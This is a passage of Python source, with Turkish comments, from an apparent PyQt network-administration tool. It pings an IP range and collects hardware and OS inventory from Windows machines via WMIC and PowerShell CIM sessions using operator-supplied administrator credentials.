                            next_pattern = f"{next_field}="
                            next_pos = output.find(next_pattern, start)
                            if next_pos > start and next_pos < end:
                                end = next_pos
                        value = output[start:end].strip()
                        data[field] = value
                
                if data:
                    return [data]
            return []
        except subprocess.TimeoutExpired:
            return []
        except Exception as e:
            return []
    
    def get_cim_info(self, ip):
        """PowerShell Get-CimInstance ile bilgi al"""
        if self.domain:
            user = f"{self.domain}\\{self.username}"
        else:
            user = self.username
        
        # Şifredeki özel karakterleri escape et (PowerShell için)
        escaped_password = self.password.replace("'", "''").replace("`", "``").replace("$", "`$")
        
        ps_script = f'''
$ErrorActionPreference = "SilentlyContinue"
$secpasswd = ConvertTo-SecureString '{escaped_password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('{user}', $secpasswd)
$so = New-CimSessionOption -Protocol Dcom
try {{
    $session = New-CimSession -ComputerName '{ip}' -Credential $cred -SessionOption $so -OperationTimeoutSec 10 -ErrorAction Stop
}} catch {{
    Write-Error "Connection failed"
    exit 1
}}

$cs = Get-CimInstance -CimSession $session -ClassName Win32_ComputerSystem -OperationTimeoutSec 10 | Select-Object Name,Manufacturer,Model,SystemType,TotalPhysicalMemory,Domain,UserName | ConvertTo-Json
$os = Get-CimInstance -CimSession $session -ClassName Win32_OperatingSystem -OperationTimeoutSec 10 | Select-Object Caption,Version,BuildNumber,OSArchitecture,InstallDate,LastBootUpTime,SerialNumber | ConvertTo-Json
$cpu = Get-CimInstance -CimSession $session -ClassName Win32_Processor -OperationTimeoutSec 10 | Select-Object Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed,CurrentClockSpeed,Manufacturer | ConvertTo-Json
$ram = Get-CimInstance -CimSession $session -ClassName Win32_PhysicalMemory -OperationTimeoutSec 10 | Select-Object Capacity,Speed,Manufacturer,PartNumber,DeviceLocator | ConvertTo-Json
$gpu = Get-CimInstance -CimSession $session -ClassName Win32_VideoController -OperationTimeoutSec 10 | Select-Object Name,AdapterRAM,DriverVersion,CurrentHorizontalResolution,CurrentVerticalResolution | ConvertTo-Json

# Disk sorgusu - birden fazla yöntem dene
$disk = "[]"
$pdisk = "[]"

# Yöntem 1: Win32_DiskDrive (tüm diskler için)
try {{
    $allDisks = @(Get-CimInstance -CimSession $session -ClassName Win32_DiskDrive -OperationTimeoutSec 20)
    if ($allDisks -and $allDisks.Count -gt 0) {{
        $disk = $allDisks | Select-Object Model,Size,MediaType,SerialNumber,InterfaceType,Index | ConvertTo-Json
    }}
}} catch {{ }}

# Yöntem 2: MSFT_PhysicalDisk (daha güvenilir, SSD/HDD tespiti için)
try {{
    $physDisks = @(Get-CimInstance -CimSession $session -Namespace "Root\\Microsoft\\Windows\\Storage" -ClassName MSFT_PhysicalDisk -OperationTimeoutSec 20)
    if ($physDisks -and $physDisks.Count -gt 0) {{
        $pdisk = $physDisks | Select-Object FriendlyName,MediaType,BusType,Size,Model | ConvertTo-Json
    }}
}} catch {{ }}

# Yöntem 3: Eğer disk boşsa, MSFT_Disk dene
if ($disk -eq "[]" -or $disk -eq $null) {{
    try {{
        $msftDisks = @(Get-CimInstance -CimSession $session -Namespace "Root\\Microsoft\\Windows\\Storage" -ClassName MSFT_Disk -OperationTimeoutSec 20)
        if ($msftDisks -and $msftDisks.Count -gt 0) {{
            $disk = $msftDisks | Select-Object @{{N='Model';E={{$_.FriendlyName}}}},Size,@{{N='MediaType';E={{'Unknown'}}}},SerialNumber,@{{N='InterfaceType';E={{$_.BusType}}}},Number | ConvertTo-Json
        }}
    }} catch {{ }}
}}

$ldisk = Get-CimInstance -CimSession $session -ClassName Win32_LogicalDisk -Filter "DriveType=3" -OperationTimeoutSec 10 | Select-Object DeviceID,Size,FreeSpace,FileSystem,VolumeName | ConvertTo-Json
$net = Get-CimInstance -CimSession $session -ClassName Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" -OperationTimeoutSec 10 | Select-Object Description,MACAddress,IPAddress,DefaultIPGateway,DNSServerSearchOrder | ConvertTo-Json
$bios = Get-CimInstance -CimSession $session -ClassName Win32_BIOS -OperationTimeoutSec 10 | Select-Object Manufacturer,Name,Version,SerialNumber,ReleaseDate | ConvertTo-Json
$sound = Get-CimInstance -CimSession $session -ClassName Win32_SoundDevice -OperationTimeoutSec 10 | Select-Object Name,Manufacturer,Status | ConvertTo-Json

Remove-CimSession -CimSession $session -ErrorAction SilentlyContinue

Write-Output "###CS###"
Write-Output $cs
Write-Output "###OS###"
Write-Output $os
Write-Output "###CPU###"
Write-Output $cpu
Write-Output "###RAM###"
Write-Output $ram
Write-Output "###GPU###"
Write-Output $gpu
Write-Output "###DISK###"
Write-Output $disk
Write-Output "###PDISK###"
Write-Output $pdisk
Write-Output "###LDISK###"
Write-Output $ldisk
Write-Output "###NET###"
Write-Output $net
Write-Output "###BIOS###"
Write-Output $bios
Write-Output "###SOUND###"
Write-Output $sound
'''
        try:
            cmd = ['powershell', '-NoProfile', '-NonInteractive', '-Command', ps_script]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60,
                                   creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            
            if result.returncode == 0 and '###CS###' in result.stdout:
                return self.parse_cim_output(result.stdout, ip)
            else:
                return None, result.stderr[:100] if result.stderr else "PowerShell bağlantı hatası"
        except subprocess.TimeoutExpired:
            return None, "Zaman aşımı (45s)"
        except Exception as e:
            return None, str(e)[:50]
    
    def parse_cim_output(self, output, ip):
        """PowerShell çıktısını parse et"""
        import json
        
        info = {
            'ip': ip,
            'status': 'success',
            'computer': {},
            'os': {},
            'cpu': {},
            'ram': {'total': '0 GB', 'modules': []},
            'gpu': [],
            'disks': [],
            'network': [],
            'bios': {},
            'sound': []
        }
        
        try:
            sections = {}
            current_section = None
            current_content = []
            
            for line in output.split('\n'):
                if line.startswith('###') and line.endswith('###'):
                    if current_section and current_content:
                        sections[current_section] = '\n'.join(current_content)
                    current_section = line.strip('#')
                    current_content = []
                elif current_section:
                    current_content.append(line)
            
            if current_section and current_content:
                sections[current_section] = '\n'.join(current_content)
            
            # Parse CS
            if 'CS' in sections:
                try:
                    cs = json.loads(sections['CS'])
                    if isinstance(cs, list): cs = cs[0]
                    info['computer'] = {
                        'name': cs.get('Name', ''),
                        'manufacturer': cs.get('Manufacturer', ''),
                        'model': cs.get('Model', ''),
                        'type': cs.get('SystemType', ''),
                        'domain': cs.get('Domain', ''),
                        'user': cs.get('UserName', ''),
                        'total_ram': int(cs.get('TotalPhysicalMemory', 0)) // (1024**3) if cs.get('TotalPhysicalMemory') else 0
                    }
                except: pass
            
            # Parse OS
            if 'OS' in sections:
                try:
                    os_data = json.loads(sections['OS'])
                    if isinstance(os_data, list): os_data = os_data[0]
                    info['os'] = {
                        'name': os_data.get('Caption', ''),
                        'version': os_data.get('Version', ''),
                        'build': os_data.get('BuildNumber', ''),
                        'arch': os_data.get('OSArchitecture', ''),
                        'install_date': str(os_data.get('InstallDate', ''))[:10],
                        'last_boot': str(os_data.get('LastBootUpTime', ''))[:16],
                        'serial': os_data.get('SerialNumber', '')
                    }
                except: pass
            
            # Parse CPU
            if 'CPU' in sections:
                try:
                    cpu = json.loads(sections['CPU'])
                    if isinstance(cpu, list): cpu = cpu[0]
                    info['cpu'] = {
                        'name': cpu.get('Name', '').strip(),
                        'cores': str(cpu.get('NumberOfCores', '')),
                        'threads': str(cpu.get('NumberOfLogicalProcessors', '')),
                        'max_speed': f"{int(cpu.get('MaxClockSpeed', 0))/1000:.2f} GHz" if cpu.get('MaxClockSpeed') else '',
                        'current_speed': f"{int(cpu.get('CurrentClockSpeed', 0))/1000:.2f} GHz" if cpu.get('CurrentClockSpeed') else '',
                        'manufacturer': cpu.get('Manufacturer', '')
                    }
                except: pass
            
            # Parse RAM
            if 'RAM' in sections:
                try:
                    ram = json.loads(sections['RAM'])
                    if not isinstance(ram, list): ram = [ram]
                    total_ram = 0
                    modules = []
                    for r in ram:
                        cap = int(r.get('Capacity', 0)) // (1024**3) if r.get('Capacity') else 0
                        total_ram += cap
                        modules.append({
                            'capacity': f"{cap} GB",
                            'speed': f"{r.get('Speed', '')} MHz",
                            'manufacturer': str(r.get('Manufacturer', '')).strip(),
                            'part': str(r.get('PartNumber', '')).strip(),
                            'slot': r.get('DeviceLocator', '')
                        })
                    info['ram'] = {'total': f"{total_ram} GB", 'modules': modules}
                except: pass
            
            # Parse GPU
            if 'GPU' in sections:
                try:
                    gpu = json.loads(sections['GPU'])
                    if not isinstance(gpu, list): gpu = [gpu]
                    for g in gpu:
                        vram = int(g.get('AdapterRAM', 0)) // (1024**3) if g.get('AdapterRAM') else 0
                        info['gpu'].append({
                            'name': g.get('Name', ''),
                            'vram': f"{vram} GB" if vram > 0 else "Shared",
                            'driver': g.get('DriverVersion', ''),
                            'resolution': f"{g.get('CurrentHorizontalResolution', '')}x{g.get('CurrentVerticalResolution', '')}"
                        })
                except: pass
            
            # Parse Disks
            disk_from_win32 = []
            pdisk_info = {}
            pdisk_list = []
            
            # Önce PDISK'i parse et (MSFT_PhysicalDisk - daha güvenilir)
            if 'PDISK' in sections:
                try:
                    pdisk_raw = sections['PDISK'].strip()
                    if pdisk_raw and pdisk_raw != '[]' and pdisk_raw != 'null':
                        pdisk = json.loads(pdisk_raw)
                        if not isinstance(pdisk, list): pdisk = [pdisk] if pdisk else []
                        for pd in pdisk:
                            if not pd: continue
                            name = pd.get('FriendlyName', '') or pd.get('Model', '')
                            media_type = pd.get('MediaType', 0)
                            bus_type = pd.get('BusType', 0)
                            size = int(pd.get('Size', 0)) // (1024**3) if pd.get('Size') else 0
                            
                            # MediaType: 3=HDD, 4=SSD, 0=Unspecified
                            # BusType: 7=USB, 11=SATA, 17=NVMe
                            disk_type = 'HDD'
                            if media_type == 4 or str(media_type) == 'SSD':
                                disk_type = 'SSD'
                            elif media_type == 3 or str(media_type) == 'HDD':
                                disk_type = 'HDD'
                            
                            bus_name = 'SATA'
                            if bus_type == 17 or str(bus_type) == 'NVMe':
                                bus_name = 'NVMe'
                                disk_type = 'SSD'
                            elif bus_type == 11 or str(bus_type) == 'SATA':
                                bus_name = 'SATA'
                            elif bus_type == 7 or str(bus_type) == 'USB':
                                bus_name = 'USB'
                            
                            pdisk_info[name.lower()] = f"{disk_type} ({bus_name})"
                            pdisk_list.append({
                                'model': name,
                                'size': f"{size} GB",
                                'type': f"{disk_type} ({bus_name})" if bus_name else disk_type,
                                'interface': bus_name,
                                'serial': ''
                            })
                except: pass
            
            # Win32_DiskDrive'dan disk bilgisi al
            if 'DISK' in sections:
                try:
                    disk_raw = sections['DISK'].strip()
                    if disk_raw and disk_raw != '[]' and disk_raw != 'null':
                        disk = json.loads(disk_raw)
                        if not isinstance(disk, list): disk = [disk] if disk else []
                        
                        for d in disk:
                            if not d: continue
                            size = int(d.get('Size', 0)) // (1024**3) if d.get('Size') else 0
                            model = d.get('Model', '')
                            interface = d.get('InterfaceType', '')
                            
                            # Disk tipini tespit et
                            disk_type = 'HDD'  # Varsayılan
                            
                            # Önce PhysicalDisk bilgisinden bak
                            model_lower = model.lower()
                            for pd_name, pd_type in pdisk_info.items():
                                if pd_name in model_lower or model_lower in pd_name:
                                    disk_type = pd_type
                                    break
                            else:
                                # PhysicalDisk'ten bulunamadıysa model adından tespit et
                                if 'nvme' in model_lower or 'NVMe' in interface:
                                    disk_type = 'NVMe SSD'
                                elif 'm.2' in model_lower or 'm2' in model_lower:
                                    disk_type = 'M.2 SSD'
                                elif 'ssd' in model_lower:
                                    if 'sata' in model_lower or interface == 'SATA':
                                        disk_type = 'SATA SSD'
                                    else:
                                        disk_type = 'SSD'
                                elif interface == 'SCSI' or interface == 'IDE':
                                    if 'ssd' in model_lower:
                                        disk_type = 'SATA SSD'
                                    else:
                                        disk_type = 'HDD'
                                
                                # Bilinen SSD markalarını kontrol et
                                ssd_brands = ['samsung', 'crucial', 'kingston', 'wd blue sn', 'wd black sn', 
                                             'sandisk', 'intel ssd', 'sk hynix', 'adata', 'patriot',
                                             'ct500p3', 'ct1000p3', 'ct2000p3',  # Crucial P3
                                             'mz-', 'mzvl', 'mzql',  # Samsung
                                             'wds', 'sn770', 'sn850', 'sn770']  # WD
                                for brand in ssd_brands:
                                    if brand in model_lower:
                                        if 'nvme' in model_lower or 'sn' in model_lower or 'p3' in model_lower:
                                            disk_type = 'NVMe SSD'
                                        else:
                                            disk_type = 'SATA SSD'
                                        break
                            
                            disk_from_win32.append({
                                'model': model,
                                'size': f"{size} GB",
                                'type': disk_type,
                                'interface': interface,
                                'serial': str(d.get('SerialNumber', '')).strip()
                            })
                except: pass
            
            # Disk listesini oluştur - Win32_DiskDrive veya PDISK'ten
            if disk_from_win32:
                info['disks'] = disk_from_win32
            elif pdisk_list:
                # Win32_DiskDrive boş geldiyse PDISK'i kullan
                info['disks'] = pdisk_list
            
            # Parse Logical Disks
            if 'LDISK' in sections:
                try:
                    ldisk = json.loads(sections['LDISK'])
                    if not isinstance(ldisk, list): ldisk = [ldisk]
                    for ld in ldisk:
                        size = int(ld.get('Size', 0)) // (1024**3) if ld.get('Size') else 0
                        free = int(ld.get('FreeSpace', 0)) // (1024**3) if ld.get('FreeSpace') else 0
                        info['disks'].append({
                            'model': f"{ld.get('DeviceID', '')} {ld.get('VolumeName', '')}",
                            'size': f"{size} GB (Boş: {free} GB)",
                            'type': 'Partition',
                            'interface': ld.get('FileSystem', ''),
                            'serial': ''
                        })
                except: pass
            
            # Parse Network
            if 'NET' in sections:
                try:
                    net = json.loads(sections['NET'])
                    if not isinstance(net, list): net = [net]
                    for n in net:
                        ip_addr = n.get('IPAddress', [])
                        if isinstance(ip_addr, list): ip_addr = ip_addr[0] if ip_addr else ''
                        gw = n.get('DefaultIPGateway', [])
                        if isinstance(gw, list): gw = gw[0] if gw else ''
                        dns = n.get('DNSServerSearchOrder', [])
                        if isinstance(dns, list): dns = ', '.join(dns) if dns else ''
                        info['network'].append({
                            'name': n.get('Description', ''),
                            'mac': n.get('MACAddress', ''),
                            'ip': ip_addr,
                            'gateway': gw,
                            'dns': dns
                        })
                except: pass
            
            # Parse BIOS
            if 'BIOS' in sections:
                try:
                    bios = json.loads(sections['BIOS'])
                    if isinstance(bios, list): bios = bios[0]
                    info['bios'] = {
                        'manufacturer': bios.get('Manufacturer', ''),
                        'name': bios.get('Name', ''),
                        'version': bios.get('Version', ''),
                        'serial': bios.get('SerialNumber', ''),
                        'date': str(bios.get('ReleaseDate', ''))[:10]
                    }
                except: pass
            
            # Parse Sound
            if 'SOUND' in sections:
                try:
                    sound = json.loads(sections['SOUND'])
                    if not isinstance(sound, list): sound = [sound]
                    for s in sound:
                        info['sound'].append({
                            'name': s.get('Name', ''),
                            'manufacturer': s.get('Manufacturer', ''),
                            'status': s.get('Status', '')
                        })
                except: pass
            
            return info, None
            
        except Exception as e:
            return None, str(e)
    
    def get_system_info(self, ip):
        """Tek bir IP'den tüm sistem bilgilerini al - WMIC kullan"""
        
        # Direkt WMIC kullan (daha güvenilir)
        info = {
            'ip': ip,
            'status': 'success',
            'computer': {},
            'os': {},
            'cpu': {},
            'ram': {'total': '0 GB', 'modules': []},
            'gpu': [],
            'disks': [],
            'network': [],
            'bios': {},
            'sound': [],
            'error': None
        }
        
        try:
            # Computer System - en önemli sorgu
            cs = self.run_wmic(ip, 'computersystem', 'Name,Manufacturer,Model,SystemType,TotalPhysicalMemory,Domain,UserName')
            if cs and len(cs) > 0 and cs[0].get('Name'):
                info['computer'] = {
                    'name': cs[0].get('Name', ''),
                    'manufacturer': cs[0].get('Manufacturer', ''),
                    'model': cs[0].get('Model', ''),
                    'type': cs[0].get('SystemType', ''),
                    'domain': cs[0].get('Domain', ''),
                    'user': cs[0].get('UserName', ''),
                    'total_ram': int(cs[0].get('TotalPhysicalMemory', 0)) // (1024**3) if cs[0].get('TotalPhysicalMemory') else 0
                }
            else:
                # İlk sorgu başarısızsa, hata döndür
                info['error'] = 'WMI bağlantısı kurulamadı'
                info['status'] = 'error'
                return info
            
            # Operating System
            os_info = self.run_wmic(ip, 'os', 'Caption,Version,BuildNumber,OSArchitecture,InstallDate,LastBootUpTime,SerialNumber')
            if os_info:
                info['os'] = {
                    'name': os_info[0].get('Caption', ''),
                    'version': os_info[0].get('Version', ''),
                    'build': os_info[0].get('BuildNumber', ''),
                    'arch': os_info[0].get('OSArchitecture', ''),
                    'install_date': os_info[0].get('InstallDate', '')[:8] if os_info[0].get('InstallDate') else '',
                    'last_boot': os_info[0].get('LastBootUpTime', '')[:12] if os_info[0].get('LastBootUpTime') else '',
                    'serial': os_info[0].get('SerialNumber', '')
                }
            
            # CPU
            cpu = self.run_wmic(ip, 'cpu', 'Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed,CurrentClockSpeed,Manufacturer')
            if cpu:
                info['cpu'] = {
                    'name': cpu[0].get('Name', '').strip(),
                    'cores': cpu[0].get('NumberOfCores', ''),
                    'threads': cpu[0].get('NumberOfLogicalProcessors', ''),
                    'max_speed': f"{int(cpu[0].get('MaxClockSpeed', 0))/1000:.2f} GHz" if cpu[0].get('MaxClockSpeed') else '',
                    'current_speed': f"{int(cpu[0].get('CurrentClockSpeed', 0))/1000:.2f} GHz" if cpu[0].get('CurrentClockSpeed') else '',
                    'manufacturer': cpu[0].get('Manufacturer', '')
                }
            
            # RAM Modules
            ram = self.run_wmic(ip, 'memorychip', 'Capacity,Speed,Manufacturer,PartNumber,DeviceLocator')
            if ram:
                total_ram = 0
                modules = []
                for r in ram:
                    cap = int(r.get('Capacity', 0)) // (1024**3) if r.get('Capacity') else 0
                    total_ram += cap
                    modules.append({
                        'capacity': f"{cap} GB",
                        'speed': f"{r.get('Speed', '')} MHz",
                        'manufacturer': r.get('Manufacturer', '').strip(),
                        'part': r.get('PartNumber', '').strip(),
                        'slot': r.get('DeviceLocator', '')
                    })
                info['ram'] = {'total': f"{total_ram} GB", 'modules': modules}
            
            # GPU
            gpu = self.run_wmic(ip, 'path win32_videocontroller', 'Name,AdapterRAM,DriverVersion,VideoProcessor,CurrentHorizontalResolution,CurrentVerticalResolution')
            if gpu:
                for g in gpu:
                    vram = int(g.get('AdapterRAM', 0)) // (1024**3) if g.get('AdapterRAM') else 0
                    res_h = g.get('CurrentHorizontalResolution', '')
                    res_v = g.get('CurrentVerticalResolution', '')
                    info['gpu'].append({
                        'name': g.get('Name', ''),
                        'vram': f"{vram} GB" if vram > 0 else "Shared",
                        'driver': g.get('DriverVersion', ''),
                        'resolution': f"{res_h}x{res_v}" if res_h and res_v else ''
                    })
            
            # Disks
            disk = self.run_wmic(ip, 'diskdrive', 'Model,Size,MediaType,SerialNumber,InterfaceType')
            if disk:
                for d in disk:
                    size = int(d.get('Size', 0)) // (1024**3) if d.get('Size') else 0
                    model = d.get('Model', '')
                    interface = d.get('InterfaceType', '')
                    model_lower = model.lower()
                    
                    # Disk tipini tespit et
                    disk_type = 'HDD'  # Varsayılan
                    
                    if 'nvme' in model_lower or 'NVMe' in interface:
                        disk_type = 'NVMe SSD'
                    elif 'm.2' in model_lower or 'm2' in model_lower:
                        disk_type = 'M.2 SSD'
                    elif 'ssd' in model_lower:
                        disk_type = 'SATA SSD' if 'sata' in model_lower else 'SSD'
                    else:
                        # Bilinen SSD markalarını kontrol et
                        ssd_brands = ['samsung', 'crucial', 'kingston', 'sandisk', 'intel ssd', 
                                     'sk hynix', 'adata', 'ct500p3', 'ct1000p3', 'ct2000p3',
                                     'mz-', 'mzvl', 'wds', 'sn770', 'sn850']
                        for brand in ssd_brands:
                            if brand in model_lower:
                                if 'sn' in model_lower or 'p3' in model_lower or 'nvme' in model_lower:
                                    disk_type = 'NVMe SSD'
                                else:
                                    disk_type = 'SATA SSD'
                                break
                    
                    info['disks'].append({
                        'model': model,
                        'size': f"{size} GB",
                        'type': disk_type,
                        'interface': interface,
                        'serial': d.get('SerialNumber', '').strip()
                    })
            
            # Logical Disks (partitions with free space)
            ldisk = self.run_wmic(ip, 'logicaldisk where drivetype=3', 'DeviceID,Size,FreeSpace,FileSystem,VolumeName')
            if ldisk:
                for ld in ldisk:
                    size = int(ld.get('Size', 0)) // (1024**3) if ld.get('Size') else 0
                    free = int(ld.get('FreeSpace', 0)) // (1024**3) if ld.get('FreeSpace') else 0
                    info['disks'].append({
                        'model': f"{ld.get('DeviceID', '')} {ld.get('VolumeName', '')}",
                        'size': f"{size} GB (Boş: {free} GB)",
                        'type': 'Partition',
                        'interface': ld.get('FileSystem', ''),
                        'serial': ''
                    })
            
            # Network Adapters
            net = self.run_wmic(ip, 'nicconfig where ipenabled=true', 'Description,MACAddress,IPAddress,DefaultIPGateway,DNSServerSearchOrder')
            if net:
                for n in net:
                    info['network'].append({
                        'name': n.get('Description', ''),
                        'mac': n.get('MACAddress', ''),
                        'ip': n.get('IPAddress', '').replace('{', '').replace('}', '').replace('"', ''),
                        'gateway': n.get('DefaultIPGateway', '').replace('{', '').replace('}', '').replace('"', ''),
                        'dns': n.get('DNSServerSearchOrder', '').replace('{', '').replace('}', '').replace('"', '')
                    })
            
            # BIOS
            bios = self.run_wmic(ip, 'bios', 'Manufacturer,Name,Version,SerialNumber,ReleaseDate')
            if bios:
                info['bios'] = {
                    'manufacturer': bios[0].get('Manufacturer', ''),
                    'name': bios[0].get('Name', ''),
                    'version': bios[0].get('Version', ''),
                    'serial': bios[0].get('SerialNumber', ''),
                    'date': bios[0].get('ReleaseDate', '')[:8] if bios[0].get('ReleaseDate') else ''
                }
            
            # Sound Devices
            sound = self.run_wmic(ip, 'sounddev', 'Name,Manufacturer,Status')
            if sound:
                for s in sound:
                    info['sound'].append({
                        'name': s.get('Name', ''),
                        'manufacturer': s.get('Manufacturer', ''),
                        'status': s.get('Status', '')
                    })
            
        except Exception as e:
            info['status'] = 'error'
            info['error'] = str(e)
        
        return info
    
    def ping_check(self, ip, timeout=1):
        """Hızlı ping kontrolü"""
        try:
            cmd = ['ping', '-n', '1', '-w', '500', ip]  # 500ms timeout
            result = subprocess.run(cmd, capture_output=True, timeout=2,
                                   creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            return result.returncode == 0
        except:
            return False
    
    def ping_batch(self, ips):
        """Toplu ping kontrolü - paralel"""
        from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
        online = []
        try:
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = {executor.submit(self.ping_check, ip): ip for ip in ips}
                # 10 saniye içinde tamamlanmayanları bırak
                done, not_done = wait(futures, timeout=10)
                for future in done:
                    ip = futures[future]
                    try:
                        if future.result(timeout=0.1):
                            online.append(ip)
                    except:
                        pass
                # Tamamlanmayanları iptal et
                for future in not_done:
                    future.cancel()
        except Exception as e:
            # Hata olursa tüm IP'leri online kabul et
            online = list(ips)
        return online
    
    def scan_single(self, ip):
        """Tek IP tara - kısa timeout ile"""
        try:
            info = self.get_system_info(ip)
            if info is None:
                return ('error', ip, 'WMI sorgusu boş döndü')
            if not isinstance(info, dict):
                return ('error', ip, f'Beklenmeyen veri tipi: {type(info).__name__}')
            if info.get('status') == 'success' and info.get('computer', {}).get('name'):
                return ('success', ip, info)
            else:
                error_msg = str(info.get('error', 'Bilgi alınamadı'))[:50] if info.get('error') else 'Bilgi alınamadı'
                return ('error', ip, error_msg)
        except TypeError as e:
            return ('error', ip, f'TypeError: {str(e)[:40]}')
        except Exception as e:
            return ('error', ip, f'{type(e).__name__}: {str(e)[:30]}')
    
    def run(self):
        from concurrent.futures import ThreadPoolExecutor, wait, TimeoutError as FuturesTimeout
        import time
        
        total = len(self.targets)
        
        # İlk stats
        self.stats['total'] = total
        self.stats['current'] = 'Ping kontrolü...'
        self.stats_update.emit(self.stats.copy())
        
        # 1. Önce toplu ping kontrolü
        self.progress_update.emit(0, total, "🏓 Ping kontrolü...")
        online_ips = self.ping_batch(self.targets)
        
        offline_count = total - len(online_ips)
        
        if not online_ips:
            self.stats['offline'] = offline_count
            self.stats['current'] = 'Yok'
            self.stats_update.emit(self.stats.copy())
            self.progress_update.emit(total, total, f"❌ Online cihaz yok ({offline_count} offline)")
            self.scan_complete.emit([])
            return
        
        self.stats['online'] = len(online_ips)
        self.stats['offline'] = offline_count
        self.stats_update.emit(self.stats.copy())
        self.progress_update.emit(0, len(online_ips), f"✅ {len(online_ips)} online, {offline_count} offline - Tarama başlıyor...")
        
        # 2. Her IP'yi sırayla ama kısa timeout ile tara
        completed = 0
        max_time_per_ip = 60  # Her IP için max 60 saniye (çok sorgu var)
        
        for ip in online_ips:
            if not self.running:
                break
            
            completed += 1
            self.stats['current'] = ip
            self.stats_update.emit(self.stats.copy())
            self.progress_update.emit(completed, len(online_ips), f"🔍 {ip} taranıyor...")
            
            # Tek IP için thread ile timeout
            try:
                with ThreadPoolExecutor(max_workers=1) as executor:
                    future = executor.submit(self.scan_single, ip)
                    try:
                        status, result_ip, data = future.result(timeout=max_time_per_ip)
                        
                        if status == 'success':
                            self.results.append(data)
                            self.system_info.emit(data)
                            self.stats['success'] += 1
                            self.stats_update.emit(self.stats.copy())
                            self.progress_update.emit(completed, len(online_ips), f"✅ {result_ip}")
                        else:
                            self.error_occurred.emit(result_ip, str(data)[:50])
                            self.stats['error'] += 1
                            self.stats_update.emit(self.stats.copy())
                            self.progress_update.emit(completed, len(online_ips), f"❌ {result_ip}")
                    except Exception as timeout_err:
                        # Timeout - devam et
                        self.error_occurred.emit(ip, f"Timeout ({max_time_per_ip}s)")
                        self.stats['error'] += 1
                        self.stats_update.emit(self.stats.copy())
                        self.progress_update.emit(completed, len(online_ips), f"⏱️ {ip} timeout, atlandı")
                        future.cancel()
            except Exception as e:
                self.error_occurred.emit(ip, str(e)[:30])
                self.stats['error'] += 1
                self.stats_update.emit(self.stats.copy())
                self.progress_update.emit(completed, len(online_ips), f"❌ {ip} hata")
        
        self.stats['current'] = 'Bitti'
        self.stats_update.emit(self.stats.copy())
        self.progress_update.emit(len(online_ips), len(online_ips), f"✅ Tamamlandı - {len(self.results)} başarılı")
        self.scan_complete.emit(self.results)


class SystemInfoWidget(QWidget):
    """Uzaktan Sistem Bilgisi / DXDiag Arayüzü"""
    def __init__(self, org=None, parent=None):
        super().__init__(parent)
        self.org = org  # OrganizationManager referansı
        self.scan_thread = None
        self.results = []
        self.credentials = {'username': '', 'password': '', 'domain': ''}
        self.setup_ui()
    
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)
        
        # === HEADER ===
        header = QLabel("💻 UZAKTAN SİSTEM BİLGİSİ (Remote DXDiag)")
        header.setStyleSheet("""
            QLabel{
                background: qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #0a1628,stop:0.5 #162850,stop:1 #0a1628);
                color: #00d4ff;
                font-size: 18px;
                font-weight: bold;
                padding: 15px;
                border: 2px solid #00d4ff;
                border-radius: 10px;
            }
        """)
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)
        
        # === KİMLİK BİLGİLERİ ===
        cred_frame = QFrame()
        cred_frame.setStyleSheet("QFrame{background:#16213e;border-radius:10px;padding:10px;}")
        cred_layout = QHBoxLayout(cred_frame)
        
        cred_layout.addWidget(QLabel("🔐 Kimlik:"))
        
        cred_layout.addWidget(QLabel("Domain:"))
        self.domain_input = QLineEdit()
        self.domain_input.setPlaceholderText("(opsiyonel)")
        self.domain_input.setMaximumWidth(100)
        self.domain_input.setStyleSheet("QLineEdit{background:#0a0a14;color:white;border:1px solid #0f3460;border-radius:4px;padding:5px;}")
        cred_layout.addWidget(self.domain_input)
        
        cred_layout.addWidget(QLabel("Kullanıcı:"))
        self.user_input = QLineEdit()
        self.user_input.setPlaceholderText("Administrator")
        self.user_input.setMaximumWidth(120)
        self.user_input.setStyleSheet("QLineEdit{background:#0a0a14;color:white;border:1px solid #0f3460;border-radius:4px;padding:5px;}")
        cred_layout.addWidget(self.user_input)
        
        cred_layout.addWidget(QLabel("Şifre:"))
        self.pass_input = QLineEdit()
        self.pass_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.pass_input.setMaximumWidth(120)
        self.pass_input.setStyleSheet("QLineEdit{background:#0a0a14;color:white;border:1px solid #0f3460;border-radius:4px;padding:5px;}")
        cred_layout.addWidget(self.pass_input)
        
        self.show_pass_btn = QPushButton("👁")
        self.show_pass_btn.setMaximumWidth(30)
        self.show_pass_btn.setCheckable(True)
        self.show_pass_btn.toggled.connect(lambda c: self.pass_input.setEchoMode(QLineEdit.EchoMode.Normal if c else QLineEdit.EchoMode.Password))
        cred_layout.addWidget(self.show_pass_btn)
        
        # Thread sayısı
        cred_layout.addWidget(QLabel("⚡"))
        self.thread_combo = QComboBox()
        self.thread_combo.addItems(["3 Thread", "5 Thread", "10 Thread", "15 Thread", "20 Thread"])
        self.thread_combo.setCurrentIndex(1)  # Varsayılan 5
        self.thread_combo.setToolTip("Paralel bağlantı sayısı (daha fazla = daha hızlı)")
        self.thread_combo.setStyleSheet("QComboBox{background:#0a0a14;color:#f39c12;padding:5px;border-radius:4px;}")
        self.thread_combo.setMaximumWidth(90)
        cred_layout.addWidget(self.thread_combo)
        
        cred_layout.addStretch()
        
        # Hedef
        cred_layout.addWidget(QLabel("🎯 Hedef:"))
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("IP veya aralık (örn: 192.168.1.1-50)")
        self.target_input.setMinimumWidth(200)
        self.target_input.setStyleSheet("QLineEdit{background:#0a0a14;color:#00ff88;border:1px solid #00ff88;border-radius:4px;padding:5px;}")
        cred_layout.addWidget(self.target_input)
        
        layout.addWidget(cred_frame)
        
        # === CİHAZ FİLTRESİ ===
